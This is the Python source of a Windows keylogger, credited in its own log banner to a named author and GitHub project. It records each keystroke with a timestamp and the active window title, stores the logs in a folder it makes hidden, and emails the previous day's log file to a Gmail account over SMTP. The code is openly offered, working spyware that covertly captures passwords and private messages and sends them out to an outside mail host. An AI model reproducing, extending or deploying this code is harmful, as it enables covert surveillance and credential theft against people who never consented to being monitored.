# Import needed libraries
# Do pip install if any library is missing on your machine.
from datetime import datetime as dt
from pynput.keyboard import Listener # Most important library
from string import printable
from win32gui import GetWindowText, GetForegroundWindow

import ctypes
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import smtplib


LETTERS = list(printable)
path = "C:/Logs"

def get_active_window() -> str: # Get active window's title
    return GetWindowText(GetForegroundWindow())

def send_mail(d : int = 1, m : int = 0):
    # Send mail of yesterday's logs
    # In order to send mails, you have to turn less secured apps on
    # I recommend creating a new gmail account for this
    # https://myaccount.google.com/lesssecureapps
    # d and m will be used as variables to use recursion
    # In order to send the logs of the last day the computer was on
    # Not limiting it to yesterday's logs ONLY.

    year, month, day, hour, minutes, secs = get_time()
    EMAIL = "Put your email here"
    PASSWORD = "Put your password here"
    if (d > day):
        send_mail(1, 1) # Go over last month's logs in case a new month comes in

    if os.path.exists(f"{path}/{year}/{int(month) - m}/{int(day) - d}/logs.txt"):
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(EMAIL, PASSWORD)
        
        message = MIMEMultipart()
        message["From"] = EMAIL
        message['To'] = EMAIL
        message['Subject'] = f"Logs from {int(day) - d}/{int(month) - m}/{year}"
        file = f"{path}/{year}/{int(month) - m}/{int(day) - d}/logs.txt"
        attachment = open(file,'rb')
        obj = MIMEBase('application','octet-stream')
        obj.set_payload((attachment).read())
        encoders.encode_base64(obj)
        obj.add_header('Content-Disposition',"attachment; filename= "+file)
        message.attach(obj)
        my_message = message.as_string()
        email_session = smtplib.SMTP('smtp.gmail.com',587)
        email_session.starttls()
        email_session.login(EMAIL, PASSWORD)
        email_session.sendmail(EMAIL, EMAIL, my_message)
        email_session.quit()
    else:
        send_mail(d=d+1)

def get_time():
    now = dt.now()
    year = now.year
    month = now.month
    day = now.day
    hour = now.hour
    minutes = now.minute
    secs = now.second
    return year, month, day, hour, minutes, secs

def setup():
    # Setup needed folders and files
    if not os.path.exists(path):
        os.mkdir(path)
        ctypes.windll.kernel32.SetFileAttributesW(path, 2) # make folder "Logs" invisible
    year, month, day, hour, minutes, secs = get_time()
    #create needed folder and txt file
    if not os.path.exists(f"{path}/{year}"):
        os.mkdir(f"{path}/{year}")
    if not os.path.exists(f"{path}/{year}/{month}"):
        os.mkdir(f"{path}/{year}/{month}")
    if not os.path.exists(f"{path}/{year}/{month}/{day}"):
        os.mkdir(f"{path}/{year}/{month}/{day}")
    if not os.path.exists(f"{path}/{year}/{month}/{day}/logs.txt"):
        with open(f"{path}/{year}/{month}/{day}/logs.txt", "w") as f:
            f.write("***********************************************************")
            f.write("\n")
            f.write("Keylogger by Nave Twizer                                  *")
            f.write("\n")
            f.write("https://github.com/NaveTwizer/Keylogger-Alpha  *")
            f.write("\n")
            f.write("***********************************************************")
            f.write("\n")

def on_press(key):
    window = get_active_window()
    if window is None:
        window = "Unknown window"
    ActiveWindow = ""
    for letter in window: #filter all unknown unicodes / characters
        if letter in LETTERS:
            ActiveWindow += letter

    year, month, day, hour, minutes, secs = get_time()
    with open(f"{path}/{year}/{month}/{day}/logs.txt", "a") as f:
        f.write(f"{hour}:{minutes}:{secs} - {str(key)}, active window: {ActiveWindow}")    
        f.write("\n")
        f.close()

def main():
    # Main function, short and straight to the point
    setup() #setup function
    send_mail() #send mail of yesterday's logs function
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
